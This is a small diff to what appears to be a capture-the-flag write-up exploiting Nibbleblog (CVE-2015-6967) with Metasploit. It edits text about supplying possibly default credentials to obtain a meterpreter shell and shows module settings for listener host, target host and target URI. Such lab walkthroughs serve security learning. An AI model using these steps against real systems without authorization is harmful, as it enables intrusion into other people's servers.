@@ -119,14 +119,14 @@ https://github.com/dix0nym/CVE-2015-6967
 ![image](https://cdn-images-1.medium.com/max/1000/1*3AEzPOCvVD08Rq76Zpms4Q.png)
 
 
-I decided to provide the path, username and password inside metasploit and then I got meterpreter shell
+I decided to provide the path, username and password (it can be default credentials). and then I got meterpreter shell!
 
 On metasploit:
 
 ```bash
 set lhost <your-ip>
 
-set rhost <target=machine>
+set rhost <target-machine>
 
 set targeturi /nibbleblog/
 
